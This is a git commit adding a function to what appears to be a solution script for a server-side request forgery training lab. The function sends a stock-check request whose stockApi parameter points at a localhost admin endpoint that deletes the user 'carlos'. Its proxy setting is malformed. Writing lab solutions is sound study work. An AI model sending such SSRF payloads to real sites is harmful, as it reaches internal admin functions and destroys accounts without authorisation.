95d8a7f12dfd18f1ab68cfadcd2d190647ad85c9
Jozenartes <jozenarts12@gmail.com>
2025-05-22 12:58:45 +0100

    delete user function

--- SSRF-lab-01.py
+++ SSRF-lab-01.py
@@ -5,6 +5,13 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http//127.0.0.1', 'https': 'http//127.0.0.1'}
 
+def delete_user(url):
+    delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
+    check_stock_path = '/product/stock'
+    params = {'stockApi': delete_user_url_ssrf_payload}
+    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
+
+
 #function that checks if the site set correclty. It requires the program to be run by adding the python version, python file and the url.
 #Example: python lab-01.py www.example.com
 def main():
@@ -17,6 +24,6 @@ def main():
     print("(+) Deleting Carlos user..")
     delete_user(url)
 
-    
+
 if __name__ == "__main__":
     main()
